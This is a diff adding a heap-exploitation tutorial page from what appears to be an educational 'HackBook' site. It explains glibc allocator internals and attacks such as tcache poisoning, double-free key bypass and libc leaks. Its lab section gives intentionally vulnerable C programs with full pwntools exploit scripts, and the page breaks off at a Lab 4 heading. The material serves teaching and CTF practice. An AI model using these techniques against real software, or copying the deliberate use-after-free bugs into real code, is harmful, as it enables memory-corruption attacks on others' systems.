@@ -1,0 +1,1982 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Heap Exploitation</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Heap Exploitation</h1>
+    <hr>
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-content active" id="notes">
+
+        <h2>Heap Fundamentals (glibc ptmalloc2)</h2>
+        <p>The heap is a region of memory used for dynamic allocation via <code>malloc()</code> / <code>free()</code>. glibc's allocator (<b>ptmalloc2</b>) manages the heap using <b>chunks</b>, <b>bins</b>, and <b>arenas</b>.</p>
+
+        <!-- ── Chunk Structure ── -->
+        <h3>Chunk Structure</h3>
+        <h4>Allocated Chunk (64-bit)</h4>
+<pre><code class="language-bash">    chunk ─►  ┌──────────────────────────────────┐
+              │         prev_size (8 bytes)       │  ◄─ only valid if previous chunk is free
+              ├──────────────────────────────────┤
+              │   size (8 bytes)  │ A │ M │ P │  ◄─ size of this chunk (including metadata)
+  mem ptr ─►  ├──────────────────────────────────┤
+              │                                  │
+              │         user data ...            │
+              │                                  │
+              └──────────────────────────────────┘
+</code></pre>
+
+        <h4>Free Chunk (64-bit)</h4>
+<pre><code class="language-bash">    chunk ─►  ┌──────────────────────────────────┐
+              │         prev_size (8 bytes)       │
+              ├──────────────────────────────────┤
+              │   size (8 bytes)  │ A │ M │ P │
+  mem ptr ─►  ├──────────────────────────────────┤
+              │         fd (forward pointer)      │  ◄─ next free chunk in bin
+              ├──────────────────────────────────┤
+              │         bk (backward pointer)     │  ◄─ prev free chunk in bin (not in fastbin/tcache)
+              ├──────────────────────────────────┤
+              │         (unused space ...)        │
+              └──────────────────────────────────┘
+</code></pre>
+
+        <h4>Chunk Metadata</h4>
+        <table class="table table-dark table-bordered">
+          <thead><tr><th>Field</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>prev_size</code></td><td>Size of the <em>previous</em> chunk (only set when previous chunk is free). Used for backward coalescing.</td></tr>
+            <tr><td><code>size</code></td><td>Size of the current chunk (including the 0x10 bytes of metadata). Low 3 bits are flags.</td></tr>
+            <tr><td><code>P</code> (bit 0)</td><td><b>PREV_INUSE</b> &mdash; set if the previous chunk is allocated. Prevents backward coalescing.</td></tr>
+            <tr><td><code>M</code> (bit 1)</td><td><b>IS_MMAPPED</b> &mdash; chunk was allocated via <code>mmap()</code>, not the heap.</td></tr>
+            <tr><td><code>A</code> (bit 2)</td><td><b>NON_MAIN_ARENA</b> &mdash; chunk belongs to a non-main arena (threaded allocation).</td></tr>
+            <tr><td><code>fd</code></td><td>Forward pointer &mdash; points to the next free chunk in the same bin (overlaps user data when free).</td></tr>
+            <tr><td><code>bk</code></td><td>Backward pointer &mdash; points to the previous free chunk (used in unsorted/small/large bins, <em>not</em> in fastbins/tcache).</td></tr>
+          </tbody>
+        </table>
+
+        <h4>Minimum Chunk Size &amp; Alignment</h4>
+        <ul>
+          <li><b>Minimum chunk size</b>: <code>0x20</code> (32 bytes) on 64-bit &mdash; 0x10 metadata + 0x10 minimum user data (to hold fd/bk when free).</li>
+          <li><b>Alignment</b>: All chunks are aligned to <code>2 * sizeof(size_t)</code> = <b>0x10 bytes</b> on 64-bit.</li>
+          <li>The <code>size</code> field is always a multiple of 0x10. Low 4 bits hold flags (only bottom 3 used).</li>
+          <li><code>malloc(0)</code> returns a <code>0x20</code>-sized chunk. <code>malloc(0x18)</code> also returns <code>0x20</code> (0x18 + 0x8 header rounded up).</li>
+        </ul>
+
+        <h4>Request-to-Chunk Size Conversion</h4>
+<pre><code class="language-python"># Quick reference for 64-bit glibc
+# chunk_size = ((request + 0x8) + 0xF) & ~0xF   (minimum 0x20)
+# Examples:
+#   malloc(0x00) → chunk 0x20    malloc(0x18) → chunk 0x20
+#   malloc(0x19) → chunk 0x30    malloc(0x28) → chunk 0x30
+#   malloc(0x29) → chunk 0x40    malloc(0x38) → chunk 0x40
+#   malloc(0x3F8) → chunk 0x400  malloc(0x3F9) → chunk 0x410
+</code></pre>
+
+        <!-- ── Bins Overview ── -->
+        <h3>Bins Overview</h3>
+<pre><code class="language-bash">  free() path (simplified, 64-bit glibc ≥ 2.26):
+
+    ┌─────────────┐     ┌───────────┐     ┌──────────────┐     ┌─────────────┐
+    │   tcache     │────►│ fastbins  │────►│ unsorted bin │────►│ small/large │
+    │ (per-thread) │     │           │     │              │     │    bins     │
+    └─────────────┘     └───────────┘     └──────────────┘     └─────────────┘
+      size ≤ 0x410       size ≤ 0x80       consolidation        sorted by size
+      7 per size         10 per size       staging area
+      LIFO singly-       LIFO singly-      doubly-linked        doubly-linked
+      linked             linked
+</code></pre>
+
+        <table class="table table-dark table-bordered">
+          <thead><tr><th>Bin Type</th><th>Size Range (64-bit)</th><th>Max Entries</th><th>Structure</th><th>Key Notes</th></tr></thead>
+          <tbody>
+            <tr><td><b>Tcache</b></td><td>0x20 &ndash; 0x410</td><td>7 per size class</td><td>Singly-linked (fd only), LIFO</td><td>Per-thread, minimal security checks, first checked on malloc/free</td></tr>
+            <tr><td><b>Fastbin</b></td><td>0x20 &ndash; 0x80</td><td>10 per size</td><td>Singly-linked (fd only), LIFO</td><td>No coalescing, chunks remain marked PREV_INUSE. Used when tcache is full.</td></tr>
+            <tr><td><b>Unsorted</b></td><td>Any (not fast)</td><td>Unlimited</td><td>Doubly-linked circular (fd+bk)</td><td>Staging area. Chunks are sorted into small/large bins on traversal. <code>fd</code>/<code>bk</code> point into <code>main_arena</code> in libc.</td></tr>
+            <tr><td><b>Small bins</b></td><td>0x20 &ndash; 0x3F0</td><td>Unlimited</td><td>Doubly-linked circular, FIFO</td><td>Exact-size match. 62 bins.</td></tr>
+            <tr><td><b>Large bins</b></td><td>≥ 0x400</td><td>Unlimited</td><td>Doubly-linked, sorted</td><td>Range-based. Chunks sorted by size within each bin.</td></tr>
+          </tbody>
+        </table>
+
+        <!-- ── Tcache Deep Dive ── -->
+        <h3>Tcache Details</h3>
+        <ul>
+          <li>Introduced in <b>glibc 2.26</b>. Per-thread cache for fast allocation.</li>
+          <li><b>64 size classes</b>: chunk sizes 0x20 through 0x410 (increments of 0x10).</li>
+          <li><b>7 entries max</b> per size class. Exceeding 7 spills to fastbins/unsorted bin.</li>
+          <li><b>LIFO</b> (stack-like): last freed chunk is first returned by <code>malloc()</code>.</li>
+          <li>Managed by a <code>tcache_perthread_struct</code> allocated as the <b>first heap chunk</b> (size 0x290).</li>
+          <li>The struct contains <code>counts[64]</code> (uint16_t) and <code>entries[64]</code> (pointers to singly-linked list heads).</li>
+        </ul>
+
+        <h4>Tcache Entry Structure</h4>
+<pre><code class="language-c">typedef struct tcache_entry {
+    struct tcache_entry *next;  // fd pointer (at offset 0x0 of user data)
+    struct tcache_perthread_struct *key;  // at offset 0x8 — glibc ≥ 2.29
+} tcache_entry;</code></pre>
+        <ul>
+          <li><code>key</code> field (glibc ≥ 2.29): set to the address of the <code>tcache_perthread_struct</code> on free. Used to detect double frees.</li>
+          <li>To bypass: overwrite the <code>key</code> field (at user_data + 0x8) with anything other than the tcache struct address before freeing again.</li>
+        </ul>
+
+        <h4>Tcache Safe-Linking (glibc ≥ 2.32)</h4>
+        <p>The <code>next</code> pointer in tcache entries is XOR-obfuscated to prevent trivial poisoning:</p>
+<pre><code class="language-c">// On free (storing into tcache):
+e->next = PROTECT_PTR(&e->next, tcache_list_head);
+// PROTECT_PTR(pos, ptr) = ((size_t)pos >> 12) ^ (size_t)ptr
+
+// On malloc (reading from tcache):
+e->next = REVEAL_PTR(e->next);
+// REVEAL_PTR(ptr) = PROTECT_PTR(&e->next, ptr)  // same operation, XOR is its own inverse</code></pre>
+        <ul>
+          <li>The <code>pos >> 12</code> value is effectively the <b>heap base address shifted right by 12</b> (page-aligned).</li>
+          <li><b>Bypass</b>: if you can leak a heap address (even a partial one), you can recover the XOR key and craft valid poisoned pointers.</li>
+          <li>First entry in an empty tcache bin: <code>next = (pos >> 12) ^ 0x0</code>, so a heap leak of the first free'd chunk's fd reveals <code>heap_base >> 12</code>.</li>
+        </ul>
+
+        <!-- ── Use-After-Free ── -->
+        <h3>Use-After-Free (UAF)</h3>
+        <p>Occurs when a pointer is used after the memory it points to has been freed. The freed chunk is placed in a bin, and a subsequent <code>malloc()</code> of the same size can return the <em>same</em> memory. If the old pointer is still accessible, reads/writes through it now alias the new allocation.</p>
+
+        <h4>Why It's Dangerous</h4>
+        <ul>
+          <li><b>Info leak</b>: free a chunk into unsorted bin → <code>fd</code>/<code>bk</code> contain libc addresses → read through dangling pointer = libc leak.</li>
+          <li><b>Arbitrary write</b>: free to tcache → <code>next</code> pointer sits in user data → overwrite through dangling pointer = tcache poisoning.</li>
+          <li><b>Control flow hijack</b>: if the chunk held a function pointer or vtable, overwriting it controls execution.</li>
+        </ul>
+
+        <h4>Exploitation Pattern</h4>
+<pre><code class="language-c">// 1. Allocate
+char *a = malloc(0x20);
+// 2. Free (chunk goes to tcache)
+free(a);
+// 3. "a" is now dangling — it still points to the freed chunk
+// 4. The freed chunk's user data now contains tcache metadata (next, key)
+// 5. Write through "a" to corrupt tcache next pointer
+*(size_t *)a = target_address;  // tcache poisoning via UAF
+// 6. malloc(0x20) returns the original chunk (pops from tcache)
+malloc(0x20);
+// 7. malloc(0x20) returns target_address
+char *arb = malloc(0x20);  // arbitrary write target</code></pre>
+
+        <!-- ── Tcache Poisoning ── -->
+        <h3>Tcache Poisoning</h3>
+        <p>Overwrite the <code>next</code> (fd) pointer of a free tcache chunk to redirect a future <code>malloc()</code> to an arbitrary address.</p>
+
+        <h4>Attack Steps (no safe-linking)</h4>
+        <ol>
+          <li>Free a chunk <b>A</b> of size <b>S</b> → goes to tcache[S]. <code>A->next = NULL</code>.</li>
+          <li>Corrupt <code>A->next</code> (via UAF, heap overflow, etc.) to point to <code>target</code>.</li>
+          <li><code>malloc(S)</code> → returns <b>A</b> (tcache pops head). tcache[S] head now points to <code>target</code>.</li>
+          <li><code>malloc(S)</code> → returns <code>target</code>. You now have an allocation at an arbitrary address.</li>
+        </ol>
+
+        <h4>With Safe-Linking (glibc ≥ 2.32)</h4>
+<pre><code class="language-python"># You need the heap base (or at least pos >> 12) to craft a valid next pointer.
+# If you leak a tcache fd from the first freed chunk:
+#   leaked_fd = (heap_addr_of_fd >> 12) ^ 0   = heap_addr_of_fd >> 12
+# So: heap_base_shifted = leaked_fd  (for the first entry)
+# To poison:
+#   fake_next = (pos >> 12) ^ target_addr
+# where pos = address of the fd field you're overwriting
+
+heap_key = leaked_fd  # heap_base >> 12
+pos = chunk_addr + 0x10  # address of the next field in user data
+fake_next = (pos >> 12) ^ target_addr
+# Write fake_next into the freed chunk's next field</code></pre>
+
+        <!-- ── Double Free ── -->
+        <h3>Double Free</h3>
+        <p>Freeing the same chunk twice creates a cycle in the tcache linked list, enabling poisoning without a separate write primitive.</p>
+
+        <h4>Tcache Key Bypass (glibc ≥ 2.29)</h4>
+        <p>On free, glibc sets <code>chunk->key = tcache_perthread_struct</code>. Before inserting into tcache, it checks if <code>key</code> already matches. To double-free:</p>
+        <ol>
+          <li>Free chunk <b>A</b> → tcache: <code>[A]</code>. <code>A->key = tcache_struct</code>.</li>
+          <li>Overwrite <code>A->key</code> (at <code>user_data + 0x8</code>) with any other value (0, junk, etc.).</li>
+          <li>Free <b>A</b> again → tcache: <code>[A → A → ...]</code> (cycle).</li>
+          <li><code>malloc()</code> returns <b>A</b>. Write a <code>target</code> address into <code>A->next</code>.</li>
+          <li><code>malloc()</code> returns <b>A</b> again (cycle). <code>malloc()</code> returns <code>target</code>.</li>
+        </ol>
+<pre><code class="language-c">char *a = malloc(0x20);
+free(a);
+// Bypass tcache key check:
+((size_t *)a)[1] = 0;  // overwrite key at user_data+0x8
+free(a);  // double free succeeds
+
+// tcache[0x30] is now: A → A → A → ... (cycle)
+char *b = malloc(0x20);  // returns A
+*(size_t *)b = (size_t)target;  // poison next → target
+malloc(0x20);  // returns A again (consuming cycle)
+char *arb = malloc(0x20);  // returns target</code></pre>
+
+        <!-- ── Unsorted Bin Attack / Leak ── -->
+        <h3>Unsorted Bin Leak (libc Address Leak)</h3>
+        <p>When a chunk is freed into the <b>unsorted bin</b> (i.e., it's too large for tcache/fastbins, or those are full), its <code>fd</code> and <code>bk</code> pointers are set to <code>&main_arena.top</code> (or more precisely, <code>&main_arena.bins[0]</code>), which is a <b>known offset from libc base</b>.</p>
+
+        <h4>How to Get a Chunk into the Unsorted Bin</h4>
+        <ul>
+          <li>Free a chunk larger than <code>0x410</code> (too big for tcache).</li>
+          <li>Free 7 chunks of the same small size to fill tcache, then free an 8th &mdash; it goes to fastbin or unsorted.</li>
+          <li>Free a chunk that is not fastbin-sized and ensure the adjacent chunk is not the top chunk (place a guard chunk after it).</li>
+        </ul>
+
+        <h4>Leaking libc</h4>
+<pre><code class="language-python">from pwn import *
+
+# In the target program, free a 0x420-sized chunk (skips tcache).
+# The chunk's fd and bk now point into main_arena in libc.
+# If you have a read primitive (UAF, format string, etc.), read the fd:
+
+leaked = u64(p.recv(6).ljust(8, b'\x00'))  # read 6 bytes from dangling ptr
+log.info(f"leaked: {hex(leaked)}")
+
+# The leaked address is &main_arena.bins[0] - some constant offset
+# For glibc 2.31: libc_base = leaked - 0x1ecbe0  (example offset)
+# For glibc 2.35: libc_base = leaked - 0x219ce0
+# Verify with: readelf -s libc.so.6 | grep main_arena
+libc_base = leaked - MAIN_ARENA_OFFSET
+log.info(f"libc base: {hex(libc_base)}")</code></pre>
+
+        <!-- ── Fastbin Dup ── -->
+        <h3>Fastbin Dup</h3>
+        <p>The fastbin equivalent of a double free. Fastbins have a simple check: they only verify <code>head != chunk</code>. Bypassed by interleaving frees:</p>
+<pre><code class="language-c">char *a = malloc(0x20);
+char *b = malloc(0x20);
+free(a);  // fastbin: [A]
+free(b);  // fastbin: [B → A]
+free(a);  // fastbin: [A → B → A]  — double free!
+// Now: malloc returns A, B, A. Writing to A poisons B's next.</code></pre>
+        <p><b>Note</b>: fastbin dup is mostly relevant for glibc &lt; 2.26 (pre-tcache) or when tcache is full. With tcache, prefer tcache poisoning.</p>
+
+        <!-- ── Heap Overflow ── -->
+        <h3>Heap Overflow into Adjacent Chunks</h3>
+        <p>If a heap buffer overflow exists, you can overwrite the metadata (size, fd, bk) of the <b>next</b> chunk on the heap.</p>
+        <ul>
+          <li><b>Overwrite <code>size</code></b>: create overlapping chunks, enabling further corruption.</li>
+          <li><b>Overwrite <code>fd</code></b>: if the next chunk is free (in tcache/fastbin), this is equivalent to tcache poisoning.</li>
+          <li><b>Overwrite <code>prev_size</code> + clear <code>P</code> flag</b>: triggers backward coalescing with a fake previous chunk (unsafe unlink).</li>
+        </ul>
+
+        <!-- ── House of Force ── -->
+        <h3>House of Force</h3>
+        <p>Overwrite the <b>top chunk's size</b> to <code>-1</code> (<code>0xFFFFFFFFFFFFFFFF</code>), making it appear enormous. Then request a precisely calculated allocation size to advance the top chunk pointer to a target address.</p>
+<pre><code class="language-python"># Offset = target_addr - top_chunk_addr - 0x20 (for chunk metadata)
+# If offset is negative, it wraps around (works because size is -1)
+malloc(offset)  # consumes from the "infinite" top chunk
+arb = malloc(0x20)  # this allocation starts at target_addr</code></pre>
+        <p><b>Note</b>: patched in modern glibc with top chunk size validation. Effective on glibc &lt; 2.29.</p>
+
+        <!-- ── GDB Heap Commands ── -->
+        <h3>GDB / pwndbg Heap Commands</h3>
+        <table class="table table-dark table-bordered">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>heap</code></td><td>Display all heap chunks with metadata</td></tr>
+            <tr><td><code>bins</code></td><td>Show all bin lists (tcache, fastbins, unsorted, small, large)</td></tr>
+            <tr><td><code>vis_heap_chunks</code></td><td>Colorized visual heap layout (alias: <code>vis</code>)</td></tr>
+            <tr><td><code>tcachebins</code></td><td>Show tcache entries per size class</td></tr>
+            <tr><td><code>fastbins</code></td><td>Show fastbin entries</td></tr>
+            <tr><td><code>unsortedbin</code></td><td>Show unsorted bin contents</td></tr>
+            <tr><td><code>smallbins</code></td><td>Show small bin contents</td></tr>
+            <tr><td><code>largebins</code></td><td>Show large bin contents</td></tr>
+            <tr><td><code>heap -v</code></td><td>Verbose heap output with chunk data</td></tr>
+            <tr><td><code>top_chunk</code></td><td>Show the top chunk (wilderness)</td></tr>
+            <tr><td><code>mp_</code></td><td>Display malloc parameters struct</td></tr>
+            <tr><td><code>arena</code></td><td>Display main_arena struct</td></tr>
+            <tr><td><code>x/40gx &lt;addr&gt;</code></td><td>Examine raw heap memory</td></tr>
+            <tr><td><code>find_fake_fast &lt;addr&gt;</code></td><td>Find candidate fake fastbin chunks near an address</td></tr>
+            <tr><td><code>p *(struct malloc_chunk *)&lt;addr&gt;</code></td><td>Print a chunk struct at a given address</td></tr>
+          </tbody>
+        </table>
+
+        <!-- ── Exploitation Primitives Summary ── -->
+        <h3>Common Exploitation Primitives</h3>
+        <table class="table table-dark table-bordered">
+          <thead><tr><th>Primitive</th><th>How (via tcache)</th><th>Impact</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><b>Arbitrary Write</b></td>
+              <td>Tcache poison → <code>malloc()</code> returns target → write data there</td>
+              <td>Overwrite <code>__free_hook</code>, <code>__malloc_hook</code>, GOT entry, return address</td>
+            </tr>
+            <tr>
+              <td><b>Arbitrary Read</b></td>
+              <td>Tcache poison → <code>malloc()</code> returns target → program prints that chunk's contents</td>
+              <td>Leak stack addresses, libc pointers, canaries</td>
+            </tr>
+            <tr>
+              <td><b>Code Execution</b></td>
+              <td>Write <code>system</code> to <code>__free_hook</code> → <code>free(chunk_containing_"/bin/sh")</code></td>
+              <td>Shell. (<code>__free_hook</code>/<code>__malloc_hook</code> removed in glibc 2.34+; use GOT or FSOP instead.)</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h4>Post-2.34 Targets (no __free_hook / __malloc_hook)</h4>
+        <ul>
+          <li><b>GOT overwrite</b>: if the binary has Partial RELRO, overwrite a GOT entry (e.g., <code>free@GOT</code> → <code>system</code>).</li>
+          <li><b>FSOP</b> (File Stream Oriented Programming): corrupt <code>_IO_list_all</code> or a <code>FILE</code> struct's vtable.</li>
+          <li><b>Stack pivot</b>: overwrite a saved return address or <code>.fini_array</code> entry.</li>
+          <li><b><code>_exit</code> / <code>__run_exit_handlers</code></b>: corrupt <code>__exit_funcs</code> list.</li>
+        </ul>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-content" id="lab">
+
+        <!-- Lab 1 -->
+        <div class="lab-card">
+          <h4>Lab 1: Basic Use-After-Free</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a use-after-free to change an "admin" flag and print the flag.</p>
+
+          <h5>Vulnerable Program</h5>
+<pre><code class="language-c">// lab1_uaf.c
+// Compile: gcc -o lab1_uaf lab1_uaf.c -no-pie -z norelro
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+struct User {
+    char name[24];
+    int is_admin;
+};
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    struct User *user = NULL;
+    char *note = NULL;
+    int choice;
+
+    while (1) {
+        puts("\n1. Create user");
+        puts("2. Delete user");
+        puts("3. Create note");
+        puts("4. Print user info");
+        puts("5. Exit");
+        printf("&gt; ");
+        scanf("%d", &choice);
+
+        switch (choice) {
+            case 1:
+                user = malloc(sizeof(struct User));
+                printf("Enter name: ");
+                read(0, user-&gt;name, 24);
+                user-&gt;is_admin = 0;
+                printf("User created at %p\n", user);
+                break;
+            case 2:
+                free(user);
+                // BUG: user pointer not NULLed (dangling pointer)
+                puts("User deleted.");
+                break;
+            case 3:
+                note = malloc(32);
+                printf("Enter note: ");
+                read(0, note, 32);
+                break;
+            case 4:
+                if (user &amp;&amp; user-&gt;is_admin) {
+                    puts("FLAG{uaf_basic_heap_exploit}");
+                } else if (user) {
+                    printf("User: %s (not admin)\n", user-&gt;name);
+                } else {
+                    puts("No user.");
+                }
+                break;
+            case 5:
+                return 0;
+        }
+    }
+}</code></pre>
+
+          <h5>Exploit</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab1_uaf')
+
+# 1. Create user (malloc(32) — sizeof(User) = 28, rounded to 0x20 chunk = 32 usable)
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'name: ', b'AAAA')
+
+# 2. Delete user — freed to tcache, but pointer still accessible
+p.sendlineafter(b'> ', b'2')
+
+# 3. Create note — same size malloc(32), gets the SAME chunk from tcache
+#    Write 24 bytes of name + 4 bytes to overwrite is_admin
+payload = b'A' * 24 + p32(1)  # is_admin = 1
+p.sendlineafter(b'> ', b'3')
+p.sendlineafter(b'note: ', payload)
+
+# 4. Print user info — dangling pointer reads from our note's data
+p.sendlineafter(b'> ', b'4')
+
+p.interactive()</code></pre>
+        </div>
+
+        <!-- Lab 2 -->
+        <div class="lab-card">
+          <h4>Lab 2: Tcache Poisoning</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use tcache poisoning via UAF to overwrite a target variable and get the flag.</p>
+
+          <h5>Vulnerable Program</h5>
+<pre><code class="language-c">// lab2_tcache_poison.c
+// Compile: gcc -o lab2_tcache_poison lab2_tcache_poison.c -no-pie -z norelro
+// Tested on: glibc 2.31 (no safe-linking)
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+long target = 0;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    char *chunks[10] = {0};
+    int choice, idx;
+    size_t size;
+
+    printf("target @ %p\n", &amp;target);
+
+    while (1) {
+        puts("\n1. Allocate");
+        puts("2. Free");
+        puts("3. Write");
+        puts("4. Check target");
+        puts("5. Exit");
+        printf("&gt; ");
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                printf("Index: "); scanf("%d", &amp;idx);
+                printf("Size: ");  scanf("%zu", &amp;size);
+                chunks[idx] = malloc(size);
+                printf("Allocated at %p\n", chunks[idx]);
+                break;
+            case 2:
+                printf("Index: "); scanf("%d", &amp;idx);
+                free(chunks[idx]);
+                // BUG: no NULL after free
+                break;
+            case 3:
+                printf("Index: "); scanf("%d", &amp;idx);
+                printf("Data: ");
+                read(0, chunks[idx], 0x30);
+                break;
+            case 4:
+                if (target == 0xdeadbeef) {
+                    puts("FLAG{tcache_poison_arbitrary_write}");
+                } else {
+                    printf("target = 0x%lx (need 0xdeadbeef)\n", target);
+                }
+                break;
+            case 5:
+                return 0;
+        }
+    }
+}</code></pre>
+
+          <h5>Exploit</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab2_tcache_poison')
+
+# Grab target address
+p.recvuntil(b'target @ ')
+target_addr = int(p.recvline().strip(), 16)
+log.info(f"target @ {hex(target_addr)}")
+
+def alloc(idx, size):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def free(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def write(idx, data):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Data: ', data)
+
+def check():
+    p.sendlineafter(b'> ', b'4')
+
+SIZE = 0x28  # chunk size 0x30
+
+# 1. Allocate chunk 0
+alloc(0, SIZE)
+
+# 2. Free chunk 0 — goes to tcache[0x30]
+free(0)
+
+# 3. UAF write: overwrite the freed chunk's next pointer with target_addr
+#    tcache[0x30]: chunk0 → target_addr
+write(0, p64(target_addr))
+
+# 4. malloc(SIZE) returns chunk0 (pop head)
+alloc(1, SIZE)
+
+# 5. malloc(SIZE) returns target_addr (pop next)
+alloc(2, SIZE)
+
+# 6. Write 0xdeadbeef to target (through chunk at target_addr)
+write(2, p64(0xdeadbeef))
+
+# 7. Check — should print flag
+check()
+
+p.interactive()</code></pre>
+        </div>
+
+        <!-- Lab 3 -->
+        <div class="lab-card">
+          <h4>Lab 3: Unsorted Bin Leak</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Leak a libc address by reading the fd/bk pointers of a chunk freed into the unsorted bin. Use the leak to calculate libc base.</p>
+
+          <h5>Vulnerable Program</h5>
+<pre><code class="language-c">// lab3_unsorted_leak.c
+// Compile: gcc -o lab3_unsorted_leak lab3_unsorted_leak.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    char *chunks[10] = {0};
+    int choice, idx;
+    size_t size;
+
+    while (1) {
+        puts("\n1. Allocate");
+        puts("2. Free");
+        puts("3. Read chunk");
+        puts("4. Exit");
+        printf("&gt; ");
+        scanf("%d", &amp;choice);
+
+        switch (choice) {
+            case 1:
+                printf("Index: "); scanf("%d", &amp;idx);
+                printf("Size: ");  scanf("%zu", &amp;size);
+                chunks[idx] = malloc(size);
+                break;
+            case 2:
+                printf("Index: "); scanf("%d", &amp;idx);
+                free(chunks[idx]);
+                // BUG: dangling pointer (UAF read)
+                break;
+            case 3:
+                printf("Index: "); scanf("%d", &amp;idx);
+                // Reads 8 bytes from the chunk (will read fd pointer if freed)
+                if (chunks[idx]) {
+                    printf("Data: ");
+                    write(1, chunks[idx], 8);
+                    puts("");
+                }
+                break;
+            case 4:
+                return 0;
+        }
+    }
+}</code></pre>
+
+          <h5>Exploit</h5>
+<pre><code class="language-python">from pwn import *
+
+p = process('./lab3_unsorted_leak')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def alloc(idx, size):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def free(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+
+def read_chunk(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'Index: ', str(idx).encode())
+    p.recvuntil(b'Data: ')
+    return p.recv(8)
+
+# 1. Allocate 8 chunks of size 0x100 to fill tcache (7 entries) + 1 extra
+for i in range(8):
+    alloc(i, 0x100)
+
+# Allocate a guard chunk so the last chunk doesn't consolidate with top
+alloc(8, 0x20)
+
+# 2. Free chunks 0-6 → fill tcache[0x110] with 7 entries
+for i in range(7):
+    free(i)
+
+# 3. Free chunk 7 → tcache full, goes to UNSORTED BIN
+#    chunk7->fd and chunk7->bk now point into main_arena (libc)
+free(7)
+
+# 4. Read chunk 7 via dangling pointer → leak fd (libc address)
+leak_bytes = read_chunk(7)
+leaked = u64(leak_bytes)
+log.info(f"leaked fd: {hex(leaked)}")
+
+# 5. Calculate libc base
+# The leaked address is main_arena + 96 (offset of bins[0] in main_arena)
+# main_arena offset from libc base varies by version:
+#   glibc 2.31: main_arena @ libc + 0x1ebb80 → leaked = libc + 0x1ecbe0
+#   glibc 2.35: main_arena @ libc + 0x219c80 → leaked = libc + 0x219ce0
+# Use: readelf -s libc.so.6 | grep __malloc_hook → main_arena is 0x10 after it
+
+main_arena_offset = libc.symbols.get('__malloc_hook', 0) + 0x10
+# Or hardcode for your libc version:
+# main_arena_offset = 0x1ebb80  # glibc 2.31
+
+libc_base = leaked - (main_arena_offset + 96)
+log.success(f"libc base: {hex(libc_base)}")
+
+# Verify alignment
+assert libc_base &amp; 0xfff == 0, "Bad libc base alignment!"
+
+system = libc_base + libc.symbols['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+log.info(f"system: {hex(system)}")
+log.info(f"/bin/sh: {hex(binsh)}")
+
+p.interactive()</code></pre>
+        </div>
+
+        <!-- Lab 4 -->
+        <div class="lab-card">
+          <h4>Lab 4: Double Free + Tcache Poison → Shell</h4>
